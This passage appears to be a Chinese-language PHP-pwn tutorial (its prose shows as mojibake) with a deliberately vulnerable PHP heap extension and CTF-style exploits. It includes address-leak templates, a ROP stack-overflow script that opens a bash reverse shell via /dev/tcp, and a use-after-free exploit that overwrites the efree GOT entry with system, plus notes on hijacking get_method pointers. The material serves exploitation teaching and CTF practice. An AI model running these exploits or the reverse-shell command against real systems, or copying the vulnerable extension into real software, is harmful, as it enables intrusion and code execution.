ZEND_PARSE_PARAMETERS_START(1, 1)\n            Z_PARAM_LONG(idx)\n            ZEND_PARSE_PARAMETERS_END();\n\n            if (notelist[idx])\n            {\n                _efree(notelist[idx]);\n                //notelist[noteChunk->idx] = NULL;\n                php_printf(\"Free Success!\\n\");\n            }\n            else\n            {\n                php_printf(\"You can't free it!There is no chunk!\\n\");\n            }\n        }\n\nPHP_FUNCTION(my_heap_editFunc)\n        {\n        \tlong idx = 0;\n        \tchar* data = \"editTest\";\n        \tsize_t data_len = sizeof(\"editTest\") - 1;\n            php_printf(\"PHP_HEAP Edit function!---003\\n\");\n\n            ZEND_PARSE_PARAMETERS_START(2,2)\n            Z_PARAM_LONG(idx)\n            Z_PARAM_STRING(data, data_len)\n            ZEND_PARSE_PARAMETERS_END();\n\n            if (notelist[idx])\n            {\n                memcpy(notelist[idx],data,data_len);\n                php_printf(\"Edit Success!\\n\");\n            }\n            else\n            {\n                php_printf(\"You can't free it!There is no chunk!\\n\");\n            }\n        }\n\n\nPHP_FUNCTION(my_heap_getFunc)\n        {\n        \tlong idx = 0;\n        \tzend_string *retval;\n            ZEND_PARSE_PARAMETERS_START(1, 1)\n            Z_PARAM_LONG(idx)\n            ZEND_PARSE_PARAMETERS_END();\n\n            php_printf(\"PHP_HEAP Show function!---004\\n\");\n            if(notelist[idx]){\n            \tretval = strpprintf(0, \"Content:%s\\n\",notelist[idx]);\n                php_printf(\"Content:%s\\n\",notelist[idx]);\n                php_printf(\"Show Success!\\n\");\n                RETURN_STR(retval);\n            }\n\n        }\n\n\n/* }}}*/\n\n\n\n/* {{{ PHP_RINIT_FUNCTION\n */\nPHP_RINIT_FUNCTION(my_heap)\n        {\n#if defined(ZTS) && defined(COMPILE_DL_MY_HEAP)\n                ZEND_TSRMLS_CACHE_UPDATE();\n#endif\n\n                return SUCCESS;\n        }\n/* }}} */\n\n/* {{{ PHP_MINFO_FUNCTION\n */\nPHP_MINFO_FUNCTION(my_heap)\n        {\n        php_info_print_table_start();\n        php_info_print_table_header(2, \"my_heap support\", \"enabled\");\n        php_info_print_table_end();\n        }\n/* }}} */\n\n/* {{{ arginfo\n */\nZEND_BEGIN_ARG_INFO(arginfo_my_heap_gift, 0)\nZEND_END_ARG_INFO()\n\n\nZEND_BEGIN_ARG_INFO(arginfo_my_heap_addFunc, 0)\nZEND_ARG_INFO(0, addSize)\nZEND_END_ARG_INFO()\n\n\nZEND_BEGIN_ARG_INFO(arginfo_my_heap_editFunc, 0)\nZEND_ARG_INFO(0, editIdx)\nZEND_ARG_INFO(0, editData)\nZEND_END_ARG_INFO()\n\n\nZEND_BEGIN_ARG_INFO(arginfo_my_heap_delFunc, 0)\nZEND_ARG_INFO(0, delIdx)\nZEND_END_ARG_INFO()\n\nZEND_BEGIN_ARG_INFO(arginfo_my_heap_getFunc, 0)\nZEND_ARG_INFO(0, showIdx)\nZEND_END_ARG_INFO()\n\n/* }}} */\n\n/* {{{ my_heap_functions[]\n */\n        static const zend_function_entry my_heap_functions[] = {\n        \t\tPHP_FE(my_heap_gift,\t\targinfo_my_heap_gift)\n                PHP_FE(my_heap_addFunc,\t\targinfo_my_heap_addFunc)\n                PHP_FE(my_heap_delFunc,\t\targinfo_my_heap_delFunc)\n                PHP_FE(my_heap_editFunc,\t\targinfo_my_heap_editFunc)\n                PHP_FE(my_heap_getFunc,\t\targinfo_my_heap_getFunc)\n                PHP_FE_END\n        };\n/* }}} */\n\n/* {{{ my_heap_module_entry\n */\n        zend_module_entry my_heap_module_entry = {\n                STANDARD_MODULE_HEADER,\n                \"my_heap\",\t\t\t\t\t/* Extension name */\n                my_heap_functions,\t\t\t/* zend_function_entry */\n                NULL,\t\t\t\t\t\t\t/* PHP_MINIT - Module initialization */\n                NULL,\t\t\t\t\t\t\t/* PHP_MSHUTDOWN - Module shutdown */\n                PHP_RINIT(my_heap),\t\t\t/* PHP_RINIT - Request initialization */\n                NULL,\t\t\t\t\t\t\t/* PHP_RSHUTDOWN - Request shutdown */\n                PHP_MINFO(my_heap),\t\t\t/* PHP_MINFO - Module info */\n                PHP_MY_HEAP_VERSION,\t\t/* Version */\n                STANDARD_MODULE_PROPERTIES\n        };\n/* }}} */\n\n#ifdef COMPILE_DL_MY_HEAP\n# ifdef ZTS\nZEND_TSRMLS_CACHE_DEFINE()\n# endif\nZEND_GET_MODULE(my_heap)\n#endif\n\n```\n\n\n\n\n\n# ä¸‰ã€æ¼æ´åˆ©ç”¨\n\nä¸€èˆ¬è€Œè¨€ï¼Œphp_pwnéƒ½å…ˆçœ‹çœ‹php.iniï¼Œå“ªäº›å‡½æ•°è¢«ç¦äº†ï¼Œæœç´¢`disable_functions`\n\n![image-20220212202639753](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202122026827.png)\n\nå½“æ²¡æœ‰ç¦æ­¢includeå‡½æ•°ã€ob_startå‡½æ•°ã€ob_get_contentså‡½æ•°ã€ob_end_flushå‡½æ•°æ—¶ï¼Œå°±å¯ä»¥æ¥è°ƒç”¨ä»è€Œç›´æ¥è·å–åœ°å€ã€‚\n\n## 1.EXPæ¨¡æ¿\n\nå…ˆæ¥å‡ ä¸ªå¸¸ç”¨çš„å‡½æ•°æ¨¡æ¿ï¼Œç”¨æ¥äº¤äº’\n\n```php\n<?php\n\nfunction u64($val) {\n   $s = bin2hex($val);\n   $len = strlen($s);\n   $ans = \"0x\";\n   for ($i=$len-2;$i>=0;$i-=2) {\n      $ans = $ans . substr($s,$i,2);\n   }\n   return intval($ans,16);\n}\n\n\nfunction p64($i, $x = 8) {\n    $re = \"\";\n    for($j = 0;$j < $x;$j++) {\n        $re .= chr($i & 0xff);\n        $i >>= 8;\n    }\n    return $re;\n}\n\n\n//åœ¨å¯ä»¥è°ƒç”¨includeå‡½æ•°ã€ob_startå‡½æ•°ã€ob_get_contentså‡½æ•°ã€ob_end_flushå‡½æ•°æ—¶\n//ä¸€èˆ¬ç”¨åœ¨å¯ä»¥ç›´æ¥å†™phpä»£ç çš„æ—¶å€™\nfunction leakaddr($buffer){\n    global $libc,$mbase;\n    $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/lib\\/x86_64-linux-gnu\\/libc-2.27.so/';\n    //$p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/lib\\/php\\/20170718\\/hackphp.so/';\n    $p_local = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/www\\/server\\/php\\/73\\/lib\\/php\\/extensions\\/no-debug-non-zts-20180731\\/my_heap.so/';\n    preg_match_all($p, $buffer, $libc);\n    //preg_match_all($p1, $buffer, $mbase);\n    preg_match_all($p_local, $buffer, $mbase);\n    return \"\";\n}\nob_start(\"leakaddr\");\ninclude(\"/proc/self/maps\");\n$buffer = ob_get_contents();\nob_end_flush();\nleakaddr($buffer);\n$libc_base=hexdec($libc[1][0]);\n$mod_base=hexdec($mbase[1][0]);\n\n\n\n//å­—ç¬¦ä¸²æ“ä½œ\n$pad_str = str_pad(string_var,length,pad_string,pad_type);//å¡«å……ï¼Œ(pad_typeå‚æ•°å¯é€‰)\n$sub_str = substr(string,idx,length);//è·å–å­å­—ç¬¦ä¸²\n$str = str_repeat('B', (0x100));\n//è·å–æ ¼å¼åŒ–è¾“å‡ºå­—ç¬¦ä¸²\necho sprintf(\"0x%lx\",$Libc_addr);\n//å­—ç¬¦ä¸²æ‹¼æ¥\n$str = $a.$b;\n//å•ä¸ªå­—ç¬¦\n$str = \"\\x00\";//å¿…é¡»æ˜¯\"\"åŒå¼•å·çš„ï¼Œä¸èƒ½æ˜¯''å•å¼•å·\n\n?>\n\n```\n\nå¹¶ä¸”ä»¥ä¸‹ç»™å‡ºçš„expéƒ½æ˜¯åŸºäºä¸Šé¢çš„æµ‹è¯•ç”¨ä¾‹\n\n\n\n## 2.æ ¼å¼åŒ–å­—ç¬¦ä¸²\n\n\n\n\n\n\n\n\n\n## 3.æ ˆæº¢å‡º\n\nä¸€èˆ¬éƒ½èƒ½å¤Ÿé€šè¿‡è¯»å–`/proc/self/maps`æ¥æ³„éœ²åœ°å€\n\næ²¡æœ‰canaryçš„æ—¶å€™ï¼Œå•çº¯æ ˆæº¢å‡ºçš„æ—¶å€™ï¼Œä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•\n\n### (1)åˆ©ç”¨poepnåå¼¹shell\n\n```python\nfrom pwn import *\n\ncontext.arch = \"amd64\"\n\ndef create_php(buf):\n    with open(\"pwn.php\", 'w+') as pf:\n        pf.write('''<?php\nmy_stack_func(urldecode(\"%s\"));\n?>'''%urlencode(buf))\n\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n\n\n#CLI:\nstack_addr = 0x7fffffffa1c0\n\n#GDB:\n#stack_addr = 0x7fffffffa1a0\n\n#WEB:\n#stack_addr = 0x7fffffffbee0\n\nELF_base = 0x7ffff12efd2a - 0xd2a\n\nstack_offset = 0xb0 + 0x8\nLibc_base = 0x7ffff47daf70 - libc.sym['printf']\n\npop_rdi_ret = Libc_base + 0x00000000000215bf\npop_rsi_ret = Libc_base + 0x0000000000023eea\npopen_addr = Libc_base + libc.sym['popen']\n\ncommand = '/bin/bash -c \"/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1\"'\n\n\nlayout = [\n    'a'*stack_offset,\n    pop_rdi_ret,\n    stack_addr+stack_offset+0x30+0x10,\n    pop_rsi_ret,\n    stack_addr+stack_offset+0x28,\n    popen_addr,\n    'r'+'\\x00'*7,\n    'a'*0x10,\n    command.ljust(0x60, '\\x00'),\n    \"a\"*0x8\n]\nbuf = flat(layout)\n\ncreate_php(buf)\n```\n\nä»¥ä¸Šä»£ç ç”Ÿæˆä¹‹åï¼Œç›´æ¥php pwn.phpè¿è¡Œæˆ–è€…è°ƒè¯•å³å¯ã€‚\n\néœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒWEBå’ŒCLIçš„æ ˆåœ°å€æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œå¦å¤–åœ¨æœ¬åœ°è¿è¡Œçš„æ—¶å€™ï¼Œç›´æ¥è¿è¡Œphpå’Œè°ƒè¯•phpä¹Ÿæœ‰ç‚¹ä¸å¤ªä¸€æ ·\n\n![image-20220212135202658](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121352773.png)\n\n\n\n![image-20220212134318923](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121343134.png)\n\nå‚ç…§[WEBPWNå…¥é—¨çº§è°ƒè¯•è®²è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/204404)\n\n\n\n#### ä¾‹é¢˜ä¸€ï¼š2020De1CTF-mixture\n\nå‚è€ƒ\n\n[WebPwnï¼šphp-pwnå­¦ä¹  - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/235237#h3-4)\n\n[De1CTF 2020 Web+Pwn mixture | Clangè£ç¼åº— (xuanxuanblingbling.github.io)](https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/)\n\n\n\n\n\n### (2)ropé“¾æ„é€ è°ƒç”¨`mprotect`å‡½æ•°æ‰§è¡Œshellcode\n\n\n\n\n\n\n\n## 4.å †æ–¹é¢\n\n### å †æœºåˆ¶ï¼š\n\né¦–å…ˆç®€å•ä»‹ç»ä¸€ä¸‹å†…å­˜æœºåˆ¶ï¼Œä½¿ç”¨`_emallocå’Œ_efree`è¿›è¡Œå†…å­˜åˆ†é…å’Œé‡Šæ”¾ï¼Œç±»ä¼¼ä¸åŠ ä»»ä½•ä¿æŠ¤çš„slub/slabæœºåˆ¶ï¼Œå­˜åœ¨FDæŒ‡é’ˆå¯ä»¥å®ç°åŠ«æŒä¹‹åä»»æ„åˆ†é…ï¼Œå¹¶ä¸”åˆ†é…çš„å¤§å°è§„æ ¼å¦‚ä¸‹\n\n```\n//å®å®šä¹‰ï¼šç¬¬ä¸€åˆ—è¡¨ç¤ºåºå·ï¼ˆç§°ä¹‹ä¸ºbin_numï¼‰ï¼Œç¬¬äºŒåˆ—è¡¨ç¤ºæ¯ä¸ªsmallå†…å­˜çš„å¤§å°ï¼ˆå­—èŠ‚æ•°ï¼‰ï¼›\n//ç¬¬å››åˆ—è¡¨ç¤ºæ¯æ¬¡è·å–å¤šå°‘ä¸ªpageï¼›ç¬¬ä¸‰åˆ—è¡¨ç¤ºå°†pageåˆ†å‰²ä¸ºå¤šå°‘ä¸ªå¤§å°ä¸ºç¬¬ä¸€åˆ—çš„smallå†…å­˜ï¼›\n#define ZEND_MM_BINS_INFO(_, x, y) \\\n    _( 0,    8,  512, 1, x, y) \\\n    _( 1,   16,  256, 1, x, y) \\\n    _( 2,   24,  170, 1, x, y) \\\n    _( 3,   32,  128, 1, x, y) \\\n    _( 4,   40,  102, 1, x, y) \\\n    _( 5,   48,   85, 1, x, y) \\\n    _( 6,   56,   73, 1, x, y) \\\n    _( 7,   64,   64, 1, x, y) \\\n    _( 8,   80,   51, 1, x, y) \\\n    _( 9,   96,   42, 1, x, y) \\\n    _(10,  112,   36, 1, x, y) \\\n    _(11,  128,   32, 1, x, y) \\\n    _(12,  160,   25, 1, x, y) \\\n    _(13,  192,   21, 1, x, y) \\\n    _(14,  224,   18, 1, x, y) \\\n    _(15,  256,   16, 1, x, y) \\\n    _(16,  320,   64, 5, x, y) \\\n    _(17,  384,   32, 3, x, y) \\\n    _(18,  448,    9, 1, x, y) \\\n    _(19,  512,    8, 1, x, y) \\\n    _(20,  640,   32, 5, x, y) \\\n    _(21,  768,   16, 3, x, y) \\\n    _(22,  896,    9, 2, x, y) \\\n    _(23, 1024,    8, 2, x, y) \\\n    _(24, 1280,   16, 5, x, y) \\\n    _(25, 1536,    8, 3, x, y) \\\n    _(26, 1792,   16, 7, x, y) \\\n    _(27, 2048,    8, 4, x, y) \\\n    _(28, 2560,    8, 5, x, y) \\\n    _(29, 3072,    4, 3, x, y)\n \n#endif /* ZEND_ALLOC_SIZES_H */\n```\n\nå½“è¶…è¿‡3Kæ—¶ï¼Œå¦‚ä¸‹åˆ†é…\n\nhugeå†…å­˜ï¼šé’ˆå¯¹å¤§äº2M-4Kçš„åˆ†é…è¯·æ±‚ï¼Œç›´æ¥è°ƒç”¨mmapåˆ†é…ï¼›\n\nlargeå†…å­˜ï¼šé’ˆå¯¹å°äº2M-4Kï¼Œå¤§äº3Kçš„åˆ†é…è¯·æ±‚ï¼Œåœ¨chunkä¸ŠæŸ¥æ‰¾æ»¡è¶³æ¡ä»¶çš„è‹¥å¹²ä¸ªè¿ç»­pageï¼›\n\nå‚è€ƒï¼š[ã€PHP7æºç åˆ†æã€‘PHPå†…å­˜ç®¡ç† - SegmentFault æ€å¦](https://segmentfault.com/a/1190000014764790)\n\nå¹¶ä¸”ä¸å­˜åœ¨æˆ‘ä»¬åœ¨glibcä¸­å¸¸è§çš„hookå‡½æ•°ï¼Œæ‰€ä»¥é€šå¸¸getshellçš„åšæ³•ä¸€èˆ¬ä¸¤ç§ï¼š\n\n**åŠ«æŒefree_got**æˆ–è€…**åŠ«æŒæŸäº›ç»“æ„ä½“çš„å‡½æ•°æŒ‡é’ˆ**\n\n### (1)åŠ«æŒefree_got\n\nä¸è¿‡è¿™ä¸ªéœ€è¦`.so`æ‹“å±•æ¨¡å—ä¸èƒ½ä¸ºFull RELROï¼Œå¾—èƒ½ä¿®æ”¹å…¶ä¸­çš„gotè¡¨ï¼Œç„¶åè¿˜å¾—åœ¨è¯¥æ‹“å±•æ¨¡å—ä¸­æœ‰è°ƒç”¨`_efree`å‡½æ•°æ‰è¡Œï¼Œç›¸å½“äºå°±æ˜¯`ret2Got`ã€‚å¾—æ³„éœ²è¯¥`.so`æ‹“å±•æ¨¡å—çš„åœ°å€æ‰è¡Œã€‚\n\nè‡ªå®šä¹‰é¢˜ç›®çš„expå¦‚ä¸‹\n\n```php\n<?php\n\nfunction u64($val) {\n   $s = bin2hex($val);\n   $len = strlen($s);\n   $ans = \"0x\";\n   for ($i=$len-2;$i>=0;$i-=2) {\n      $ans = $ans . substr($s,$i,2);\n   }\n   return intval($ans,16);\n}\n\n\nfunction p64($i, $x = 8) {\n    $re = \"\";\n    for($j = 0;$j < $x;$j++) {\n        $re .= chr($i & 0xff);\n        $i >>= 8;\n    }\n    return $re;\n}\n\nfunction leakaddr($buffer){\n    global $libc,$mbase;\n    $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/lib\\/x86_64-linux-gnu\\/libc-2.27.so/';\n    //$p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/lib\\/php\\/20170718\\/hackphp.so/';\n    $p_local = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/www\\/server\\/php\\/73\\/lib\\/php\\/extensions\\/no-debug-non-zts-20180731\\/my_heap.so/';\n    preg_match_all($p, $buffer, $libc);\n    //preg_match_all($p1, $buffer, $mbase);\n    preg_match_all($p_local, $buffer, $mbase);\n    return \"\";\n}\n\n$_efree_got = 0x202068;\n$system_addr = 0x4f550;\n\n\nob_start(\"leakaddr\");\ninclude(\"/proc/self/maps\");\n$buffer = ob_get_contents();\nob_end_flush();\nleakaddr($buffer);\n$libc_base=hexdec($libc[1][0]);\n$mod_base=hexdec($mbase[1][0]);\n\nmy_heap_addFunc(0x10);\nmy_heap_delFunc(0);\nmy_heap_editFunc(0,p64($mod_base+$_efree_got));\nmy_heap_addFunc(0x10);\nmy_heap_editFunc(1,\"cat flag\\x00\");\nmy_heap_addFunc(0x10);\nmy_heap_editFunc(2,p64($libc_base+$system_addr));\nmy_heap_delFunc(1);\n?>\n```\n\n\n\n### (2)åŠ«æŒget_methodå‡½æ•°æŒ‡é’ˆ\n\nç®€å•æ¥è¯´ï¼Œå°±æ˜¯åŠ«æŒå‡½æ•°æŒ‡é’ˆ`zend_object->zval->zend_object_handlers->get_method`\n\n#### åŸç†å¦‚ä¸‹ï¼š\n\n##### â‘ zend_object\n\nå½“å®šä¹‰å£°æ˜ä¸€ä¸ªclasså¯¹è±¡æ—¶\n\n```\nclass Lucky{\n\tpublic    $a0, $a1;\n}\n\n$lucky = new Lucky();\n$lucky->a1 = function ($x) { };\n```\n\nå½“åœ¨phpä¸­å£°æ˜Luckyè¿™ä¸ªclasså¯¹è±¡æ—¶ï¼Œä¼šè‡ªåŠ¨å£°æ˜ä¸€ä¸ªå¯¹åº”å¤§å°`zend_object`ç»“æ„\n\n```c\n//7.3/src/Zend/zend_types.h å¤§å°56\nstruct _zend_object {\n    zend_refcounted_h gc;\n    uint32_t          handle; // TODO: may be removed ???\n    zend_class_entry *ce;\n    const zend_object_handlers *handlers;\n    HashTable        *properties;\n    zval              properties_table[1];\n};\n```\n\næ­£å¸¸æ¥è¯´ï¼Œåˆ›å»ºclasså¯¹è±¡éƒ½ä¼šæœ‰æˆå‘˜ï¼Œä½†æ˜¯åœ¨phpä¸­å…¶å®ä¹Ÿå¯ä»¥å£°æ˜æ²¡æœ‰æˆå‘˜çš„classå¯¹è±¡ï¼Œé‚£ä¹ˆæ­¤æ—¶è¯¥classå¯¹åº”çš„`zend_object`çš„å¤§å°å³ä¸º56-8=48ã€‚æ‰€ä»¥classå¯¹è±¡ä¸­çš„æˆå‘˜è¶Šå¤šï¼Œå…¶`zend_object`ç»“æ„çš„å¤§å°å°±è¶Šå¤§ã€‚\n\n##### â‘¡zval\n\nè€Œæ¯ä¸€ä¸ªæˆå‘˜åœ¨å†…å­˜ä¸­å®é™…ååº”çš„å°±æ˜¯`zval`ç»“æ„ä½“\n\n```c\n//7.3/src/Zend/zend_types.h  å¤§å°0x10\nstruct _zval_struct {\n\tzend_value        value;\t\t\t/* value */\n\tunion {\n\t\tstruct {\n\t\t\tZEND_ENDIAN_LOHI_3(\n\t\t\t\tzend_uchar    type,\t\t\t/* active type */\n\t\t\t\tzend_uchar    type_flags,\n\t\t\t\tunion {\n\t\t\t\t\tuint16_t  call_info;    /* call info for EX(This) */\n\t\t\t\t\tuint16_t  extra;        /* not further specified */\n\t\t\t\t} u)\n\t\t} v;\n\t\tuint32_t type_info;\n\t} u1;\n\tunion {\n\t\tuint32_t     next;                 /* hash collision chain */\n\t\tuint32_t     cache_slot;           /* cache slot (for RECV_INIT) */\n\t\tuint32_t     opline_num;           /* opline number (for FAST_CALL) */\n\t\tuint32_t     lineno;               /* line number (for ast nodes) */\n\t\tuint32_t     num_args;             /* arguments number for EX(This) */\n\t\tuint32_t     fe_pos;               /* foreach position */\n\t\tuint32_t     fe_iter_idx;          /* foreach iterator index */\n\t\tuint32_t     access_flags;         /* class constant access flags */\n\t\tuint32_t     property_guard;       /* single property guard */\n\t\tuint32_t     constant_flags;       /* constant flags */\n\t\tuint32_t     extra;                /* not further specified */\n\t} u2;\n};\n```\n\næ‰€ä»¥classå¯¹è±¡çš„`zend_object`ç»“æ„çš„å¤§å°å…¬å¼ä¸º\n\n```\n48 + amount_of_member*0x10\n```\n\næ¯”å¦‚ä¸Šè¿°çš„luckyå¯¹è±¡çš„`zend_object`ç»“æ„çš„å¤§å°å³ä¸º`48+0x10*2=0x50`\n\n##### â‘¢zend_object_handlers\n\nè€Œæ¯ä¸ªzvalç»“æ„ä½“ä¸­çš„valueå€¼æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå½“è¯¥æˆå‘˜ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œé‚£ä¹ˆå…¶ä¸ºä¸€ä¸ª`zend_string`ç»“æ„ä½“æŒ‡é’ˆ\n\n```c\n//7.3/src/Zend/zend_types.h\nstruct _zend_string {\n\tzend_refcounted_h gc;\n\tzend_ulong        h;                /* hash value */\n\tsize_t            len;\n\tchar              val[1];\n};\n```\n\nå½“è¯¥æˆå‘˜ä¸ºå‡½æ•°æ—¶ï¼Œå…¶ä¸ºä¸€ä¸ª`zend_object_handlers`æŒ‡é’ˆ\n\n```c\n//7.3/src/Zend/zend_object_handlers.h\nstruct _zend_object_handlers {\n\t/* offset of real object header (usually zero) */\n\tint\t\t\t\t\t\t\t\t\t\toffset;\n\t/* general object functions */\n\tzend_object_free_obj_t\t\t\t\t\tfree_obj;\n\tzend_object_dtor_obj_t\t\t\t\t\tdtor_obj;\n\tzend_object_clone_obj_t\t\t\t\t\tclone_obj;\n\t/* individual object functions */\n\tzend_object_read_property_t\t\t\t\tread_property;\n\tzend_object_write_property_t\t\t\twrite_property;\n\tzend_object_read_dimension_t\t\t\tread_dimension;\n\tzend_object_write_dimension_t\t\t\twrite_dimension;\n\tzend_object_get_property_ptr_ptr_t\t\tget_property_ptr_ptr;\n\tzend_object_get_t\t\t\t\t\t\tget;\n\tzend_object_set_t\t\t\t\t\t\tset;\n\tzend_object_has_property_t\t\t\t\thas_property;\n\tzend_object_unset_property_t\t\t\tunset_property;\n\tzend_object_has_dimension_t\t\t\t\thas_dimension;\n\tzend_object_unset_dimension_t\t\t\tunset_dimension;\n\tzend_object_get_properties_t\t\t\tget_properties;\n\tzend_object_get_method_t\t\t\t\tget_method;\n\tzend_object_call_method_t\t\t\t\tcall_method;\n\tzend_object_get_constructor_t\t\t\tget_constructor;\n\tzend_object_get_class_name_t\t\t\tget_class_name;\n\tzend_object_compare_t\t\t\t\t\tcompare_objects;\n\tzend_object_cast_t\t\t\t\t\t\tcast_object;\n\tzend_object_count_elements_t\t\t\tcount_elements;\n\tzend_object_get_debug_info_t\t\t\tget_debug_info;\n\tzend_object_get_closure_t\t\t\t\tget_closure;\n\tzend_object_get_gc_t\t\t\t\t\tget_gc;\n\tzend_object_do_operation_t\t\t\t\tdo_operation;\n\tzend_object_compare_zvals_t\t\t\t\tcompare;\n};\n```\n\nåŒæ ·çš„ï¼Œä¹Ÿå¯¹åº”æœ‰å…¶ä»–çš„å˜é‡ç±»å‹ï¼Œç”±zvalä¸­çš„typeæ¥å†³å®šï¼Œtypeå€¼çš„ä¸åŒä»£è¡¨ä¸åŒçš„ç±»å‹ï¼Œæ¯”å¦‚stringä¸º6ï¼Œå‡½æ•°objectä¸º8\n\n```c\n//src/Zend/zend_types.h\n/* regular data types */\n#define IS_UNDEF\t\t\t\t\t0\n#define IS_NULL\t\t\t\t\t\t1\n#define IS_FALSE\t\t\t\t\t2\n#define IS_TRUE\t\t\t\t\t\t3\n#define IS_LONG\t\t\t\t\t\t4\n#define IS_DOUBLE\t\t\t\t\t5\n#define IS_STRING\t\t\t\t\t6\n#define IS_ARRAY\t\t\t\t\t7\n#define IS_OBJECT\t\t\t\t\t8\n#define IS_RESOURCE\t\t\t\t\t9\n#define IS_REFERENCE\t\t\t\t10\n\n/* constant expressions */\n#define IS_CONSTANT_AST\t\t\t\t11\n\n/* internal types */\n#define IS_INDIRECT             \t13\n#define IS_PTR\t\t\t\t\t\t14\n#define _IS_ERROR\t\t\t\t\t15\n\n/* fake types used only for type hinting (Z_TYPE(zv) can not use them) */\n#define _IS_BOOL\t\t\t\t\t16\n#define IS_CALLABLE\t\t\t\t\t17\n#define IS_ITERABLE\t\t\t\t\t18\n#define IS_VOID\t\t\t\t\t\t19\n#define _IS_NUMBER\t\t\t\t\t20\n```\n\næ±‡æ€»ä¸€ä¸‹ï¼Œå°±æ˜¯åˆ›å»ºä¸€ä¸ªclassç±»ï¼Œç„¶ååŠ«æŒå…¶å‡½æ•°æˆå‘˜åˆ›å»ºçš„`zval`ç»“æ„ä½“ä¸­çš„`zend_object_handlers`æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬å¯æ§çš„åŒºåŸŸï¼Œç„¶ååœ¨å¯¹åº”åç§»å¤„ä¿®æ”¹`get_method`æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œä»è€Œæ¥åå¼¹shellã€‚\n\næˆ–è€…è¯´ç›´æ¥åŠ«æŒå‡½æ•°æˆå‘˜åˆ›å»ºçš„`zval`ç»“æ„ä½“ä¸­çš„`zend_object_handlers`æŒ‡å‘çš„å†…å­˜åŒºåŸŸä¸­çš„`get_method`æŒ‡é’ˆï¼Œä¹Ÿæ˜¯èƒ½èµ·åˆ°ä¸€æ ·çš„ä½œç”¨ã€‚\n\n#### ç»•è¿‡ç‚¹\n\nä¸è¿‡è¿˜æ˜¯éœ€è¦ç»•è¿‡ä¸€äº›ä¿æŠ¤çš„ï¼Œè°ƒç”¨`get_method`å‡½æ•°æŒ‡é’ˆè²Œä¼¼è¿˜æ˜¯éœ€è¦ç»•è¿‡ä¸€äº›ä¸œè¥¿çš„ï¼Œè¿™é‡Œä¸çŸ¥é“å…·ä½“çš„åŸç†ï¼Œä¸è¿‡ä¿®æ”¹ç‚¹è¿˜æ˜¯å¯ä»¥è¯´æ˜çš„\n\n##### â‘ write_dimension\n\nè¿™ä¸ªéœ€è¦ä¿®æ”¹çš„ï¼Œå¸¸è§çš„å¦‚ä¸‹ï¼Œéœ€è¦ä¿®æ”¹æœ€ä½çš„ä¸º0x1\n\n![image-20220216190812859](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161908211.png)\n\nç›¸å¯¹åº”çš„ä¿®æ”¹å¦‚ä¸‹\n\n![image-20220216190925728](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161909956.png)\n\nç›¸å…³æ£€æµ‹çš„ä»£ç å¦‚ä¸‹\n\n![image-20220216194142467](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161941846.png)\n\n\n\n##### â‘¡get_methodçš„é€‰æ‹©\n\nç”±äºè°ƒç”¨è¯¥å‡½æ•°æŒ‡é’ˆæ—¶ï¼Œä¼ è¿›æ¥çš„rdiå‚æ•°å¹¶éæ˜¯æˆ‘ä»¬çš„Cè¯­è¨€ä¸Šçš„å­—ç¬¦ä¸²ç±»å‹çš„æŒ‡é’ˆï¼Œè€Œè²Œä¼¼æ˜¯ä¸€ä¸ªç±»ä¼¼`zend_string`çš„æŒ‡é’ˆï¼Œç±»ä¼¼å¦‚ä¸‹\n\n![image-20220216193001312](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161930594.png)\n\næ‰€ä»¥ä¸èƒ½ä½¿ç”¨å¸¸è§„æ„ä¹‰`system`æˆ–è€…`popen`å‡½æ•°ç­‰ï¼Œéœ€è¦è°ƒç”¨phpä¸­çš„ç›¸å…³å†…ç½®çš„å‡½æ•°æ¥å¯¹å‚æ•°è¿›è¡Œè§£æå†æ‰§è¡Œã€‚ä¸€èˆ¬é€‰æ‹©çš„æ˜¯phpç¨‹åºä¸­çš„`php_exec`å‡½æ•°ä¸‹é¢çš„å‡½æ•°ä»£ç ï¼Œä¸‹å›¾çº¢æ¡†æ‰€ç¤º\n\n![image-20220216191438382](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161914467.png)\n\nåŒæ ·çš„ï¼Œä»¥ä¸Šçš„ç»“æ„ä½“åœ¨å †ä¸­é€šå¸¸ä¹Ÿå¯ä»¥ç”¨æ¥æ³„éœ²åœ°å€\n\nä¾‹é¢˜å°±æ˜¯2021WMCTF checkin\n\n[2021WMCTF_checkinå­¦ä¹ PHP PWN - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/253189#h2-4)\n\n[PHP pwnå…¥é—¨1 - æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ - HackMD](https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/Sy7hS9bBS?type=view)\n\n# 